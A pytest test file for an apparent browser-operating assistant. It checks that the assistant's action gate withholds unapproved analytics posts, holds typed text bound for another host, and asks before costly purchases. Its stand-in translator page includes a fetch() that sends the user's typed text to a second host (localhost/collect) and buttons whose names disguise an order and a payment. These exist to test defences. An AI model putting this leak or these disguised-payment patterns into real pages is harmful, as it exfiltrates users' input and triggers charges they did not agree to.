"""Steps the person asked for on a site they named run through with no question (web/opheld.py): their own words
typed there go to that site as the field's content; what a choice or a press sends is the reviewer's, and what it
does not pass that carries nothing of theirs is not sent and asks nobody (a site's statistics); what they typed going
to another site is still held for them, and a costly act stays asked whatever its button or its request is called.
(2026-11-23: asked to open DeepL and translate 你好 into English, the reviewer passed the statistics endpoint once and
not the next time, so a click on the target-language list asked the person and waited 42 seconds.)

The site is a stand-in translator on 127.0.0.1 in the headless browser, which posts statistics on every click and
the text to translate as it is typed; with ?leak it also posts the text to another host (localhost). No model
runs; the answers and the reviewer are scripted."""
from __future__ import annotations

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace
from typing import ClassVar

import pytest

from mibo import crossing, review
from mibo.web import gate, operate

PAGE = """<!doctype html><meta charset="utf-8"><title>Translator</title>
<textarea id="src" aria-label="源文本"></textarea>
<div id="lang" role="combobox" aria-label="请选择目标语言。当前已选择： 德语" tabindex="0" style="cursor:pointer">德语</div>
<button id="done">完成</button> <button id="pay">立即支付</button>
<p id="out"></p>
<script>
const post = (path, body) => fetch(path, {method: "POST", headers: {"Content-Type": "text/plain"}, body});
document.addEventListener("click", () => { post("/web/statistics", '{"event":"click","page":"translator"}');
  post("/client-events", '{"n":' + Math.round(performance.now()) + '}'); }, true);
src.addEventListener("input", () => {
  post("/jsonrpc", JSON.stringify({method: "translate", text: src.value, target: "DE"}));
  if (location.search.includes("leak"))
    fetch("http://localhost:PORT/collect", {method: "POST", mode: "no-cors", headers: {"Content-Type": "text/plain"},
                                            body: src.value});
});
lang.onclick = () => { lang.textContent = "英语";
  post("/jsonrpc", JSON.stringify({method: "translate", text: src.value, target: "EN"})); out.textContent = "Hello"; };
done.onclick = () => post("/api/order", '{"plan":"pro","pay":199}');
pay.onclick = () => post("/web/statistics", '{"order":"pro","pay":199}');
</script>"""
SAID = "打开 127.0.0.1 然后将中文你好翻译成英文"  # copy: voice


class Site(BaseHTTPRequestHandler):
    """The translator, and every POST it receives by path."""
    posts: ClassVar[list] = []

    def do_GET(self):
        self._send(200, "text/html; charset=utf-8", PAGE.replace("PORT", str(self.server.server_address[1])))

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode("utf-8", "replace")
        Site.posts.append((self.path, body))
        self._send(204, "text/plain", "")

    def do_OPTIONS(self):
        self._send(204, "text/plain", "")

    def _send(self, status: int, kind: str, text: str) -> None:
        raw = text.encode()
        self.send_response(status)
        self.send_header("Content-Type", kind)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def log_message(self, *args):
        pass


def posted(path: str) -> list[str]:
    return [body for where, body in Site.posts if where == path]


class Run:
    """Hands on the translator with scripted answers: each card the person is shown and each review asked."""

    def __init__(self, page, tmp, answers=(), passes=()):
        self.cards, self.reviews, self.answers = [], [], list(answers)

        async def ask(card):
            self.cards.append(card)
            return self.answers.pop(0)

        async def judge(action):
            # A stand-in reviewer that passes only the addresses in `passes`, as a reviewer passes the translation
            # the person asked for and doubts the site's own counting.
            self.reviews.append(action)
            address = (action.get("request") or {}).get("address", "")
            return review.Verdict("go" if any(address.endswith(p) for p in passes) else "ask", "stand-in", "review")
        from mibo.web.tabs import PlaywrightTab
        self.hands = operate.Hands(PlaywrightTab(page), ask=ask, allowed=gate.Allowed(tmp), attended=lambda: True,
                                   review=judge, said=lambda: SAID)

    def ref(self, role: str, name: str) -> int:
        return next(i for i, (r, n) in self.hands.page.last.items() if (r, n) == (role, name))


@pytest.fixture
def translator(tmp_path):
    from mibo import installed_browser
    try:
        from playwright.async_api import async_playwright
    except ImportError as missing:
        pytest.skip(f"no Playwright: {missing}")
    Site.posts = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), Site)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    loop = asyncio.new_event_loop()
    pw = loop.run_until_complete(async_playwright().start())
    found = installed_browser.find_browser()
    try:
        browser = loop.run_until_complete(pw.chromium.launch(executable_path=str(found) if found else None,
                                                             headless=True))
    except Exception as missing:
        loop.run_until_complete(pw.stop())
        server.shutdown()
        pytest.skip(f"no headless browser: {missing}")
    page = loop.run_until_complete(browser.new_page(viewport={"width": 900, "height": 700}))
    address = f"http://127.0.0.1:{server.server_address[1]}/"
    yield SimpleNamespace(page=page, run=loop.run_until_complete, tmp=tmp_path, address=address)
    loop.run_until_complete(browser.close())
    loop.run_until_complete(pw.stop())
    loop.close()
    server.shutdown()
    server.server_close()


def test_a_site_they_name_is_named_by_any_common_spelling():
    for words in ("打开deepl然后将中文你好翻译成英文", "用 DeepL 翻译", "去 deepl.com 翻译一下", "open DEEPL"):  # copy: voice
        assert crossing.named("deepl.com", words, site=True), words
    assert not crossing.named("deepl.com", "用 deep 翻译", site=True)  # copy: voice
    assert not crossing.named("deepl-translate.example", "打开deepl", site=True)  # copy: voice
    # A name the app knows for one site, never the first label of any address that happens to be in their words.
    assert not crossing.named("deepl.xyz", "打开deepl翻译", site=True)  # copy: voice
    for site, words in (("ate.xyz", "translate this"), ("lat.top", "translate this"), ("go.dev", "go translate")):
        assert not crossing.named(site, words, site=True), site


@pytest.mark.browser
def test_typing_their_words_and_choosing_the_language_on_the_named_site_asks_nothing(translator):
    run = Run(translator.page, translator.tmp, passes=("/jsonrpc",))

    async def go():
        await translator.page.goto(translator.address)
        await run.hands.look()
        typed = await run.hands.act({"do": "type", "id": run.ref("textbox", "源文本"), "text": "你好"})  # copy: voice
        await asyncio.sleep(0.3)
        await run.hands.look()
        chose = await run.hands.act({"do": "click", "id": run.ref("combobox", "请选择目标语言。当前已选择： 德语")})
        await asyncio.sleep(0.5)
        await run.hands.close()
        return typed, chose
    typed, chose = translator.run(go())
    assert (typed["status"], chose["status"]) == ("ok", "ok")
    assert run.cards == []
    assert any('"你好"' in body and '"EN"' in body for body in posted("/jsonrpc"))
    # The statistics of the click that only typed went; those of the choice the reviewer did not pass were not sent,
    # and the step says so.
    assert posted("/web/statistics") and posted("/client-events") and "[not sent]" in chose["line"]


@pytest.mark.browser
def test_their_words_going_to_another_site_are_held_for_them_and_never_left_to_the_reviewer(translator):
    run = Run(translator.page, translator.tmp, answers=[{"yes": False, "never": False}])

    async def go():
        await translator.page.goto(translator.address + "?leak")
        await run.hands.look()
        await run.hands.act({"do": "type", "id": run.ref("textbox", "源文本"), "text": "你好"})  # copy: voice
        await asyncio.sleep(0.5)
        await run.hands.look()
        await run.hands.close()
    translator.run(go())
    assert len(run.cards) == 1 and run.cards[0]["site"].startswith("localhost") and run.reviews == []
    # Not even its first character went as it was typed; the field put back empty when the run ended carries nothing.
    assert [body for body in posted("/collect") if body] == [] and posted("/jsonrpc")


@pytest.mark.browser
def test_a_costly_act_is_asked_whatever_its_button_or_its_request_is_called(translator):
    run = Run(translator.page, translator.tmp, answers=[{"yes": False, "never": False}])

    async def go():
        await translator.page.goto(translator.address)
        await run.hands.look()
        # An innocent name whose press orders: the reviewer reads what it sends; not passed, it is not sent.
        done = await run.hands.act({"do": "click", "id": run.ref("button", "完成")})
        await run.hands.look()
        # A paying name whose request looks like statistics: judged by the control before any press, no reviewer.
        paid = await run.hands.act({"do": "click", "id": run.ref("button", "立即支付")})
        await run.hands.close()
        return done, paid
    done, paid = translator.run(go())
    assert "[not sent]" in done["line"] and paid["status"] == "declined"
    assert [c["kind"] for c in run.cards] == ["order"]
    assert any((r.get("request") or {}).get("address", "").endswith("/api/order") for r in run.reviews)
    assert posted("/api/order") == [] and not any('"order"' in body for body in posted("/web/statistics"))
